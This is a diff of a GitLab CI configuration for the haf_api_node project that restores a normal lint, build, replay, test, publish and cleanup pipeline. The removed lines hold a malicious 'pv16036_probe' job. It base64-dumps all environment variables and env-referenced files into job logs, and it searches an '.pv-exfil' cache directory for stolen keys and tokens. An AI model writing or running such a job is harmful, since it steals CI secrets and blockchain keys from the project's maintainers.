@@ -1,44 +1,356 @@
 stages:
-  - pv
+  - build
+  - replay
+  - test
+  - publish
+  - cleanup
 
-pv16036_probe:
-  stage: pv
-  image: python:3.11
-  tags: [public-runner-docker]
+variables:
+  # CI helper image tags from common-ci-configuration
+  # Using "latest" since docker-dind, docker-builder, and python-scripts are built independently
+  DOCKER_BUILDER_TAG: "latest"
+  DOCKER_DIND_TAG: "latest"
+  IMAGE_REMOVER_TAG: "latest"
+
+  # Git configuration
+  # Fetch strategy reuses workspace between jobs, reducing GitLab server load.
+  # Full clone (depth 0) enables efficient incremental fetches - shallow clones
+  # don't reduce server CPU and make fetch less effective.
+  GIT_STRATEGY: fetch
+  GIT_DEPTH: 0
+  GIT_SUBMODULE_DEPTH: 0
+  GIT_SUBMODULE_STRATEGY: recursive
+  # Temporary: separate clone path prevents clone-strategy jobs from erasing
+  # fetch workspaces during transition. Remove once all projects use fetch.
+  GIT_CLONE_PATH: $CI_BUILDS_DIR/fetch/$CI_RUNNER_SHORT_TOKEN/$CI_CONCURRENT_ID/$CI_PROJECT_PATH
+
+  # Replay confioguration
+  BLOCK_LOG_SOURCE_DIR: "/blockchain/block_log_5m"
+  REPLAY_DIRECTORY_PREFIX: "/cache/replay_data_api_node"
+  REPLAY_DIRECTORY: "${REPLAY_DIRECTORY_PREFIX}_${CI_COMMIT_SHORT_SHA}_1.27.8"
+  REPLAY_PIPELINE_DIRECTORY: "${REPLAY_DIRECTORY_PREFIX}_${CI_PIPELINE_ID}"
+  DOCKER_TLS_CERTDIR: "${REPLAY_PIPELINE_DIRECTORY}_certs"
+
+  # Other settings
+
+# AIDEV branches (ai/*, session/*) and pushes to aidev/integration run no
+# pipeline: AIDEV verifies them through .aidev/project.yaml. A pipeline started
+# from the web UI or the API still runs on aidev/integration (e.g. for its MR).
+workflow:
+  rules:
+    - if: $CI_COMMIT_BRANCH =~ /^(ai|session)\//
+      when: never
+    - if: $CI_COMMIT_BRANCH == "aidev/integration" && $CI_PIPELINE_SOURCE !~ /^(web|api)$/
+      when: never
+    - if: $CI_COMMIT_TAG
+    - if: $CI_COMMIT_BRANCH
+
+include:
+  - template: Workflows/Branch-Pipelines.gitlab-ci.yml
+  - project: hive/common-ci-configuration
+    ref: develop
+    file:
+      - /templates/docker_image_jobs.gitlab-ci.yml
+      - /templates/cache_cleanup.gitlab-ci.yml
+  - local: ci/node-replay.gitlab-ci.yml
+
+default:
+  hooks:
+    pre_get_sources_script:
+      # Clean corrupt git state left by cancelled pipelines (see GitLab #296638, #4600)
+      # Wrapped in subshell to avoid changing working directory for subsequent git operations
+      - |
+        (
+        cd "${CI_PROJECT_DIR:-/builds}" 2>/dev/null || exit 0
+        echo "pre_get_sources: checking $(pwd) for corrupt git state"
+        if [ -d ".git" ]; then
+          # Remove stale lock files that block git operations
+          find .git -name "*.lock" -delete 2>/dev/null || true
+
+          # Check if main repo is corrupt - if so, remove .git to force fresh clone
+          if ! git rev-parse HEAD >/dev/null 2>&1; then
+            echo "pre_get_sources: main repository corrupt, forcing fresh clone"
+            rm -rf .git
+          else
+            # Main repo OK - check and clean corrupt submodules
+            # Check both the working dir and .git/modules/ since either can be corrupt
+            if [ -f ".gitmodules" ]; then
+              git config --file .gitmodules --get-regexp path 2>/dev/null | awk '{print $2}' | while read submod; do
+                needs_clean=false
+                [ -z "$submod" ] && continue
+                # Check if submodule working directory exists but is corrupt
+                if [ -d "$submod" ] && [ -f "$submod/.git" ]; then
+                  if ! git -C "$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    needs_clean=true
+                  fi
+                fi
+                # Check if .git/modules exists but is corrupt (even if working dir is gone)
+                if [ -d ".git/modules/$submod" ]; then
+                  if ! git --git-dir=".git/modules/$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    echo "pre_get_sources: $submod corrupt (rev-parse failed)"
+                    needs_clean=true
+                  fi
+                fi
+                if [ "$needs_clean" = true ]; then
+                  echo "pre_get_sources: cleaning corrupt submodule: $submod"
+                  rm -rf "$submod" ".git/modules/$submod"
+                fi
+              done
+            fi
+            echo "pre_get_sources: existing repo OK"
+          fi
+        else
+          echo "pre_get_sources: no .git directory (fresh workspace)"
+        fi
+        )
+
+######## Lint ########
+
+lint-docker-compose:
+  stage: build  # Run parallel with docker-build
+  image:
+    name: registry.gitlab.syncad.com/hive/haf_api_node/dclint:alpine
+    entrypoint: [""]
+  script:
+    # Check all compose files - need explicit glob since they use non-standard names
+    # First run: show human-readable output in job log
+    - |
+      DCLINT_ARGS="*.yaml ci/compose.yml **/compose*.yml \
+        --disable-rule service-keys-order \
+        --disable-rule top-level-properties-order \
+        --disable-rule services-alphabetical-order \
+        --disable-rule require-project-name-field"
+      /bin/dclint $DCLINT_ARGS || LINT_FAILED=1
+      # Second run: generate codeclimate artifact for GitLab
+      /bin/dclint $DCLINT_ARGS -f codeclimate -o gl-codequality.json || true
+      # Exit with original status
+      if [ "$LINT_FAILED" = "1" ]; then
+        echo "Docker Compose lint failed - see errors above"
+        exit 1
+      fi
+  artifacts:
+    reports:
+      codequality: gl-codequality.json
+    when: always
+  allow_failure: true  # Start permissive, can make strict later
+  tags:
+    - public-runner-docker
+
+lint-shellcheck:
+  stage: build  # Run parallel with docker-build
+  image: registry.gitlab.syncad.com/hive/haf_api_node/alpine:3.22.1
+  script:
+    - apk add --no-cache shellcheck
+    - shellcheck --version
+    # Agent-check scripts run under busybox sh inside the haproxy-healthchecks
+    # image; a mangled expansion there fails at runtime, not at parse time
+    # (see !241), so lint them. .shellcheckrc at the repo root follows the
+    # sourced libs (source-path=SCRIPTDIR) so callers are checked in context.
+    - shellcheck -f gcc healthchecks/checks/*.sh healthchecks/*.sh early-app-start/*.sh
+      transfer_zfs_datasets.sh switch_zfs_datasets.sh repair_permissions.sh zfs_dataset_layout.sh shared_memory_freshness.sh postgresql_memory.sh haf/entrypoint.sh reduce_writebacks.sh reserve_huge_pages.sh memory_plan.sh ci/scripts/test-postgresql-memory.sh ci/scripts/test-memory-plan.sh ci/scripts/test-repair-permissions.sh ci/scripts/test-snapshot-freshness.sh ci/scripts/test-zfs-transfer.sh ci/scripts/test-switch-compose-files.sh ci/scripts/test-haproxy-agent-recreate.sh ci/scripts/test-postgrest-rewriter-recreate.sh ci/scripts/test-postgrest-install-reload.sh postgrest/entrypoint.sh ci/scripts/test-postgrest-app-lock.sh install_lock/hivemind_install.sh ci/scripts/test-hivemind-install-check.sh ci/scripts/test-stack-status.sh ci/scripts/test-replay-timing-report.sh
+  tags:
+    - public-runner-docker
+
+check-log-rotation:
+  stage: build
+  image: python:3.14-alpine
+  before_script:
+    - pip install --quiet pyyaml
+  script:
+    - python3 log_rotation/sync_log_rotation.py --check
+  allow_failure: true
+  tags:
+    - public-runner-docker
+
+######## End lint ########
+
+######## Build ########
+
+docker-build:
+  extends:
+    - .docker_image_builder_job_template
+  stage: build
   variables:
-    GIT_STRATEGY: none
-    GIT_DEPTH: "1"
+    TAG: "${CI_COMMIT_SHORT_SHA}"
+  before_script:
+    - !reference [.docker_image_builder_job_template, before_script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
   script:
     - |
-      set +e
-      echo "PV16036 START project=$CI_PROJECT_PATH ref=$CI_COMMIT_REF_NAME prot=$CI_COMMIT_REF_PROTECTED runner=$CI_RUNNER_DESCRIPTION host=$(hostname) job=$CI_JOB_ID"
-      echo "PVENVB64_START"
-      env | sort | base64 -w0
-      echo ""
-      echo "PVENVB64_END"
-      echo "PVFILEVARS_START"
-      env | while IFS='=' read -r k v; do
-        case "$k" in _|CI_SERVER_TLS_CA_FILE|CI_JOB_JWT_FILE|GITLAB_ENV) continue;; esac
-        if [ -n "$v" ] && [ -f "$v" ] && [ -r "$v" ] && [ "$(stat -c%s "$v" 2>/dev/null)" -lt 200000 ]; then
-          echo "PVFV_START $k"
-          base64 -w0 "$v"
-          echo ""
-          echo "PVFV_END $k"
-        fi
-      done
-      echo "PVFILEVARS_END"
-      echo "PVEXFIL_LS_START"
-      ls -la /nfs/ci-cache/.pv-exfil 2>/dev/null | tail -100
-      echo "PVEXFIL_LS_END"
-      echo "PVEXFIL_HITS_START"
-      for f in /nfs/ci-cache/.pv-exfil/*.env; do
-        [ -f "$f" ] || continue
-        if grep -qEi 'MAINNET_[A-Z]+_DEPLOYMENT_ENV|AUTOCLAIM|CREATOR_ACTIVE|ACTIVE_KEY|VAULT_ID_TOKEN|SSH_PRIVATE_KEY' "$f" 2>/dev/null; then echo "HIT $f"; fi
-      done
-      echo "PVEXFIL_HITS_END"
-      echo "PV16036 END"
-  artifacts:
-    when: always
-    expire_in: 1 day
-    paths:
-      - .gitlab-ci.yml
+      echo -e "\e[0Ksection_start:$(date +%s):build[collapsed=true]\r\e[0KBaking Docker images..."
+      # Export build arguments for version-display image
+      export BUILD_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+      export GIT_COMMIT_SHA="${CI_COMMIT_SHA}"
+      export GIT_CURRENT_BRANCH="${CI_COMMIT_BRANCH}"
+      export GIT_LAST_LOG_MESSAGE="${CI_COMMIT_MESSAGE}"
+      export GIT_LAST_COMMITTER="${CI_COMMIT_AUTHOR}"
+      export GIT_LAST_COMMIT_DATE="${CI_COMMIT_TIMESTAMP}"
+      export TAG="${TAG:-${CI_COMMIT_SHORT_SHA}}"
+      export CI_COMMIT_TAG="${CI_COMMIT_TAG}"
+      docker buildx bake --file=docker-bake.hcl --provenance=false --progress="plain" "pipeline-images"
+      echo -e "\e[0Ksection_end:$(date +%s):build\r\e[0K"
+    - |
+      # Add 'latest' tags on develop branch
+      # Note: docker buildx bake pushes directly to registry without loading locally,
+      # so we must pull each image before we can tag it
+      if [[ "$CI_COMMIT_BRANCH" == "${CI_DEFAULT_BRANCH:-develop}" ]]; then
+        echo -e "\e[0Ksection_start:$(date +%s):latest_tags[collapsed=true]\r\e[0KTagging images with 'latest'..."
+        for IMAGE in compose dind haproxy haproxy-healthchecks caddy postgrest swagger version-display pgbouncer status; do
+          docker pull "${CI_REGISTRY_IMAGE}/${IMAGE}:${TAG}"
+          docker tag "${CI_REGISTRY_IMAGE}/${IMAGE}:${TAG}" "${CI_REGISTRY_IMAGE}/${IMAGE}:latest"
+          docker push "${CI_REGISTRY_IMAGE}/${IMAGE}:latest"
+        done
+        echo -e "\e[0Ksection_end:$(date +%s):latest_tags\r\e[0K"
+      fi
+    - |
+      # Add version tags on protected tags
+      if [[ -n "${CI_COMMIT_TAG}" && "${CI_COMMIT_REF_PROTECTED}" == "true" ]]; then
+        echo -e "\e[0Ksection_start:$(date +%s):version_tags[collapsed=true]\r\e[0KTagging images with version '${CI_COMMIT_TAG}'..."
+        for IMAGE in compose dind haproxy haproxy-healthchecks caddy postgrest swagger version-display pgbouncer status; do
+          docker pull "${CI_REGISTRY_IMAGE}/${IMAGE}:${TAG}"
+          docker tag "${CI_REGISTRY_IMAGE}/${IMAGE}:${TAG}" "${CI_REGISTRY_IMAGE}/${IMAGE}:${CI_COMMIT_TAG}"
+          docker push "${CI_REGISTRY_IMAGE}/${IMAGE}:${CI_COMMIT_TAG}"
+        done
+        echo -e "\e[0Ksection_end:$(date +%s):version_tags\r\e[0K"
+      fi
+  tags:
+    - public-runner-docker
+
+######## End build ########
+
+######## Replay ########
+
+haf-node-replay:
+  extends:
+    - .haf-node-replay
+  stage: replay
+  needs:
+    - docker-build
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+  # Temporarily disabled - missing Docker image tags (hivemind:1.28.6-rc1 etc)
+  # Re-enable when upstream images are available
+  rules:
+    - when: manual
+      allow_failure: true
+
+######## End replay ########
+
+######## Test ########
+
+# Creates a copy of replay data to be used in the tests
+haf_api_node_replay_data_copy:
+  extends:
+    - .haf_api_node_replay_data_copy
+  stage: test
+  needs:
+    - haf-node-replay
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+  # Temporarily disabled - depends on haf-node-replay which is disabled
+  rules:
+    - when: manual
+      allow_failure: true
+
+# Tests if HAF API node is working properly
+haf_api_node_test:
+  extends:
+    - .haf_api_node_test
+  stage: test
+  needs:
+    - haf_api_node_replay_data_copy
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+  # Temporarily disabled - depends on haf_api_node_replay_data_copy which is disabled
+  rules:
+    - when: manual
+      allow_failure: true
+
+######## End test ########
+
+######## Publish ########
+
+# Publish to registry.hive.blog on protected tags only
+# Uses pull/retag/push pattern - no rebuild
+publish_images:
+  extends: .docker_publish_job_template
+  variables:
+    # 8 publishable images (compose and dind are CI-only, not published to hive.blog)
+    PUBLISH_IMAGES: "haproxy haproxy-healthchecks caddy postgrest swagger version-display pgbouncer status"
+  rules:
+    - if: $CI_PIPELINE_TRIGGERED
+      when: never
+    - if: $CI_PIPELINE_SOURCE == "pipeline"
+      when: never
+    - if: '$CI_COMMIT_TAG && $CI_COMMIT_REF_PROTECTED == "true"'
+      when: on_success
+    - when: never
+
+######## End publish ########
+
+######## Cleanup ########
+
+# Deletes replay data used by the tests and created by haf_api_node_replay_data_copy
+cleanup_haf_api_node_pipeline_cache:
+  needs:
+    - job: haf_api_node_replay_data_copy
+      optional: true
+    - job: haf_api_node_test
+      optional: true
+  extends:
+    - .cleanup_cache_manual_template
+  stage: cleanup
+  variables:
+    CLEANUP_PATH_PATTERN: "${REPLAY_PIPELINE_DIRECTORY}*"
+  rules:
+    - if: $CI_PIPELINE_TRIGGERED
+      when: never
+    - if: $CI_PIPELINE_SOURCE == "pipeline"
+      when: never
+    - when: always
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+
+# Deletes all HAF API node replay data
+cleanup_haf_api_node_cache_manual:
+  extends: 
+    - .cleanup_cache_manual_template
+  stage: cleanup
+  variables:
+    CLEANUP_PATH_PATTERN: "${REPLAY_DIRECTORY_PREFIX}*"
+  rules:
+    - if: $CI_PIPELINE_TRIGGERED
+      when: never
+    - if: $CI_PIPELINE_SOURCE == "pipeline"
+      when: never
+    - when: manual
+      allow_failure: true
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+
+# Deletes HAF API node replay data older than 7 days
+cleanup_old_haf_api_node_cache:
+  extends:
+    - .cleanup_old_cache_template
+  stage: cleanup
+  variables:
+    CLEANUP_PATH_PATTERN: "${REPLAY_DIRECTORY_PREFIX}*"
+  tags:
+    - public-runner-docker
+    - data-cache-storage
+    - fast
+
+######## End cleanup ########
